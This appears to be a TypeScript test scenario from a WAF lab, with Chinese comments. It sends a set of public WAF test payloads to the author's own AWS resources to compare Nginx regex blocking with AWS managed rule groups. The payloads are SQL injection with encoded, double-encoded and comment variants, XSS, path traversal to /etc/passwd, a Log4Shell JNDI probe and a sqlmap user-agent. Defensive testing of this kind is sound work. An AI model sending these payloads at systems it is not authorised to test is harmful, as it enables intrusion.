/**
 * waf/payloads —— 攻击载荷识别对比（01#waf 第 5 节步骤 2）。只针对自己账号里的资源，遵守 AWS 渗透测试政策（手册注明）。
 *
 *   npm run exp -- waf --label before --scenario payloads   # 纯 Nginx 的几条正则：编码变体有漏网
 *   npm run exp -- waf --label after  --scenario payloads   # AWS 托管规则组：对编码变体识别更强
 *
 * 每条路径发送一组标准的 WAF 测试载荷（SQL 注入及其 URL / 二次编码变体、目录穿越、脚本注入、Log4Shell 探针字符串、
 * 扫描器 User-Agent），生成“直连 vs 经 WAF”的状态码对照表。防御性测试：这些是公开的 WAF 测试字符串，用来演示
 * Nginx 正则（容易被编码变体绕过）与 AWS 托管规则组的差别，不攻击任何第三方系统。
 */
import { defineScenario, strParam } from '../_lib/scenario.js';
import { mapLimit } from '../_lib/util.js';
import { attackClient, originEvidence, runNonce, wafSegment, wafTargets, withNonce } from './lib.js';

interface Payload { id: string; category: string; path: string; headers?: Record<string, string>; blocksInNginx: boolean }

/** 标准 WAF 测试载荷（公开集合）。blocksInNginx = cloudalbum.conf 的 $ca_block 正则是否命中（演示其局限）。 */
export const PAYLOADS: Payload[] = [
  { id: 'sqli-plain', category: 'SQLi', path: "/api/public/search?q=1'+UNION+SELECT+1", blocksInNginx: true },
  { id: 'sqli-url', category: 'SQLi（URL 编码）', path: '/api/public/search?q=1%27%20UNION%20SELECT%201', blocksInNginx: true },
  { id: 'sqli-double', category: 'SQLi（二次编码）', path: '/api/public/search?q=1%2527%2520UNION%2520SELECT', blocksInNginx: false },
  { id: 'sqli-case', category: 'SQLi（大小写 / 注释）', path: '/api/public/search?q=1/**/UnIoN/**/SeLeCt', blocksInNginx: false },
  { id: 'xss', category: 'XSS', path: '/api/public/search?q=%3Cscript%3Ealert(1)%3C/script%3E', blocksInNginx: true },
  { id: 'traversal', category: '目录穿越', path: '/api/public/search?f=../../etc/passwd', blocksInNginx: true },
  { id: 'traversal-enc', category: '目录穿越（编码）', path: '/api/public/search?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd', blocksInNginx: true },
  { id: 'log4shell-header', category: 'Log4Shell（请求头）', path: '/api/public/now', headers: { 'X-Api-Version': '${jndi:ldap://example.invalid/a}' }, blocksInNginx: false },
  { id: 'scanner-ua', category: '扫描器 UA', path: '/api/public/now', headers: { 'user-agent': 'sqlmap/1.7' }, blocksInNginx: false },
];

export default defineScenario({
  warmupWithRun: false,
  async run(ctx) {
    const mode = strParam(ctx, 'target', 'both');
    const nonce = runNonce(ctx);
    const { direct, edge } = wafTargets(ctx);
    const targets: Array<['direct' | 'edge', string]> = [];
    if (mode !== 'edge') targets.push(['direct', direct]);
    if (mode !== 'direct' && edge) targets.push(['edge', edge]);
    if (!targets.length) { ctx.note('没有可用的目标'); return; }

    const table: Record<string, Record<string, { status: number; waf?: string; blocked: boolean }>> = {};
    for (const [target, base] of targets) {
      const client = attackClient(ctx, base, target);
      const row: Record<string, { status: number; waf?: string; blocked: boolean }> = {};
      await mapLimit(PAYLOADS, 4, async (p) => {
        const res = await client.get(withNonce(p.path, nonce), { route: '/api/public/*', expect: [200, 400, 403, 404, 429], ...(p.headers ? { headers: p.headers } : {}) });
        const seg = wafSegment(res);
        row[p.id] = { status: res.status, ...(seg ? { waf: seg } : {}), blocked: res.status === 403 || res.status === 429 };
      });
      table[target] = row;
    }

    if (ctx.phase !== 'measure') return;
    for (const [target, row] of Object.entries(table)) {
      const blocked = Object.values(row).filter((r) => r.blocked).length;
      ctx.finding(target, { blocked, total: PAYLOADS.length, byPayload: row });
    }
    // which encoded variants slipped past Nginx but AWS WAF caught (the point of the comparison)
    if (table.direct && table.edge) {
      const caughtOnlyByWaf = PAYLOADS.filter((p) => !table.direct![p.id]!.blocked && table.edge![p.id]!.blocked).map((p) => p.id);
      ctx.finding('caughtOnlyByWaf', caughtOnlyByWaf);
    }
    ctx.finding('payloadIds', PAYLOADS.map((p) => p.id));
    const origin = await originEvidence(ctx.client, ctx.runId, nonce).catch(() => undefined);
    if (origin) ctx.finding('origin', { nonceCount: origin.nonce?.count ?? 0, byPort: origin.byPort });
    else ctx.note('/api/lab/waf/origin 不可用：只有客户端看到的状态码');
  },
});
